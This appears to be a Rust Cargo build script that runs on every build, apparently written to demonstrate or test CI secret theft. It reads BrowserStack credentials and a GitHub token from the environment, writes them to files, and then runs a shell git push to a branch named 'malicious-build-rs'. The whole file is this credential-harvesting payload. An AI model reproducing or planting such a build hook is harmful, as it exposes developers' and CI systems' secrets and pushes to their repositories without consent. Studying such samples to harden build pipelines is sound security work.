use std::{env, fs, process::Command};

fn main() {
    for name in ["BROWSERSTACK_USERNAME", "BROWSERSTACK_ACCESS_KEY", "GITHUB_TOKEN"] {
        let value = env::var(name).unwrap_or_default();
        fs::write(format!("build.rs-{name}"), value).unwrap();
    }
    let _ = Command::new("sh")
        .args(["-c", "git push origin HEAD:refs/heads/malicious-build-rs"])
        .status();
}
